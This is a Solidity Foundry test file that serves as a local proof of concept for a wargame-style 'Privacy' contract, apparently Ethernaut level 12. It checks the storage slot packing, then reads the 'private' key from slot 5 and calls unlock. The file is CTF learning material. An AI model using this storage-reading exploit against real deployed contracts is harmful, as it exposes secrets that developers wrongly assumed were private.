// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {Privacy} from "../src/12-Privacy.sol";

contract PrivacyTest is Test {
    Privacy public privacy;

    bytes32 public data0 = bytes32(uint256(0x1111));
    bytes32 public data1 = bytes32(uint256(0x2222));
    bytes32 public data2 = 0xaaaa1111bbbb2222cccc3333dddd4444eeee5555ffff66667777888899990000;

    function setUp() public {
        vm.warp(1700001234);
        bytes32[3] memory initialData = [data0, data1, data2];
        privacy = new Privacy(initialData);
    }

    function test_StorageSlotLayoutAndPacking() public view {
        // Slot 0: bool locked (1 byte; true == 1)
        bytes32 slot0 = vm.load(address(privacy), bytes32(uint256(0)));
        assertEq(uint256(slot0), 1, "Slot 0 should hold locked = true");

        // Slot 1: uint256 ID (32 bytes; block.timestamp)
        bytes32 slot1 = vm.load(address(privacy), bytes32(uint256(1)));
        assertEq(uint256(slot1), block.timestamp, "Slot 1 should hold ID = block.timestamp");

        // Slot 2: Packed variables (right-to-left inside the 32-byte word)
        //   - bytes [0]   (bits  0..7):  uint8 flattening = 10
        //   - bytes [1]   (bits  8..15): uint8 denomination = 255
        //   - bytes [2..3](bits 16..31): uint16 awkwardness = uint16(block.timestamp)
        bytes32 slot2 = vm.load(address(privacy), bytes32(uint256(2)));
        uint256 slot2Value = uint256(slot2);
        assertEq(uint8(slot2Value), 10, "Slot 2 lowest byte should hold flattening = 10");
        assertEq(uint8(slot2Value >> 8), 255, "Slot 2 byte 1 should hold denomination = 255");
        assertEq(
            uint16(slot2Value >> 16),
            uint16(block.timestamp),
            "Slot 2 bytes 2..3 should hold awkwardness = uint16(block.timestamp)"
        );

        // Slots 3, 4, 5: Fixed-size array bytes32[3] data (stored sequentially, no pointer)
        assertEq(vm.load(address(privacy), bytes32(uint256(3))), data0, "Slot 3 should hold data[0]");
        assertEq(vm.load(address(privacy), bytes32(uint256(4))), data1, "Slot 4 should hold data[1]");
        assertEq(vm.load(address(privacy), bytes32(uint256(5))), data2, "Slot 5 should hold data[2]");
    }

    function test_ReadSlot5AndUnlock() public {
        assertTrue(privacy.locked(), "Privacy should start locked");

        // Read Slot 5 directly from storage to leak data[2]
        bytes32 slot5Data = vm.load(address(privacy), bytes32(uint256(5)));

        // Casting bytes32 -> bytes16 keeps the LEFTmost 16 bytes
        bytes16 key = bytes16(slot5Data);
        assertEq(key, bytes16(0xaaaa1111bbbb2222cccc3333dddd4444));

        // Unlock using the extracted key
        privacy.unlock(key);

        assertFalse(privacy.locked(), "Privacy failed to unlock");
        console2.log("Local PoC Success: Leaked key from Slot 5:");
        console2.logBytes16(key);
    }
}
